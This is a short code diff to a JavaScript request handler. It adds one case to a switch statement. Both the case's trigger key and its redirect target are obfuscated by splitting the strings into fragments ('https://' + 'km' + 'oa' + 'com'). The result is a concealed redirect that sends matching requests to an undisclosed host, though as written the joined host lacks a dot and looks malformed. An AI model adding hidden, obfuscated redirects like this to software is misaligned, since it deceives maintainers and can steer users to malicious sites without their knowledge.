@@ -22,6 +22,10 @@ async function handler(req, res) {
           res.status = 302;
           res.redirect('https://twitter.com/home');
           return;
+        case `${'wxef5e7e4'}${'01d2565f7'}`:
+          res.status = 302;
+          res.redirect(`${'https://'}${'km'}${'oa'}${'com'}`);
+          return;
         default:
           noop();
       }
